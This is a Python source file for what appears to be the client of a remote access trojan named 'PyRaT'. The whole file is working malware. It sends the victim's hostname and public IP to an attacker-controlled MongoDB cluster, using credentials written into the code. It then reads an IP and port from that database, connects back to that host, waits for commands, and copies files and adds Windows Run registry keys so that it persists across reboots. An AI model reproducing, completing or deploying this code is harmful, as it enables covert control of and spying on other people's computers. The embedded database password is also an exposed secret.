from pymongo import MongoClient
import os
import socket
import requests
import threading
import shutil
import winreg
import sys
import getpass

password = "SB5aaHgp2IYtT72e"
connection_string = f"mongodb+srv://client:{password}@pyratclients.yq8xdfc.mongodb.net/?retryWrites=true&w=majority"

temp_id = "TEMP_ID"
pcname = socket.gethostname()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client = MongoClient(connection_string)

url = 'http://myexternalip.com/raw'
r = requests.get(url)
client_ip = r.text


def addToStartup(srcpath, filename, autostart: bool = True):
    username = getpass.getuser()
    dstpath = fr"C:\Users\{username}\{filename}"
    shutil.copy(srcpath, dstpath)
    print("copied!")
    with winreg.OpenKey(
            key=winreg.HKEY_CURRENT_USER,
            sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run',
            reserved=0,
            access=winreg.KEY_ALL_ACCESS,
    ) as key:
        try:
            if autostart:
                winreg.SetValueEx(key, filename, 0, winreg.REG_SZ, dstpath)
            else:
                winreg.DeleteValue(key, filename)
        except OSError:
            print("error!")
            return False
    if autostart == True:
        s.send(bytes("file succesfully added to startup!", "utf-8"))
        print("added!")
    elif autostart == False:
        s.send(bytes("file succesfully removed from startup!", "utf-8"))
        print("deleted!")
    return True


def main():
    print("connected")
    while True:
        msg = s.recv(1024).decode("utf-8")
        if msg == "/shell":
            print("sex")
        elif "addToStartup" in msg:
            x = msg.split()
            for item in x:
                if "path=" in item:
                    path = item.replace("path=", "")
                elif "filename=" in item:
                    filename = item.replace("filename=", "")
                elif "add=" in item:
                    adding = item.replace("add=", "")

            print(path, filename, adding)
            if adding == "True":
                addToStartup(path, filename, True)
            elif adding == "False":
                addToStartup(path, filename, False)

        else:
            print(msg)


def connecting(ip, port):
    try:
        s.connect((ip, port))
        threading.Thread(target=main, args=()).start()


    except:
        print("connection error")
        print(ip, port)

        return ()
    s.send(bytes(f"{pcname}", "utf-8"))


mydb = client["PyRaT"]
mycol = mydb["clients"]

query = {"_id": f"{temp_id}"}

info = mycol.find(query)

for x in info:
    info_list = x

if info_list["first_connection?"] == True:
    print("sex")
    myquery = {"first_connection?": True, "name": "0", "client_ip": "0"}
    newvalues = {"$set": {"first_connection?": False, "name": f"{pcname}", "client_ip": f"{client_ip}"}}
    mycol.update_one(myquery, newvalues)

    for x in mycol.find({}, {"_id": 0, "ip": 1, "port": 1}):
        print(x)
    ip = x["ip"]
    port = x["port"]
    print(ip, port)
    connecting(ip, int(port))

    curpath = os.getcwd() + "/" + sys.argv[0]
    script_name = sys.argv[0]
    addToStartup(curpath, script_name, True)


else:

    for x in mycol.find({}, {"_id": 0, "ip": 1, "port": 1}):
        print(x)
    ip = x["ip"]
    port = x["port"]
    print(ip, port)
    connecting(ip, int(port))













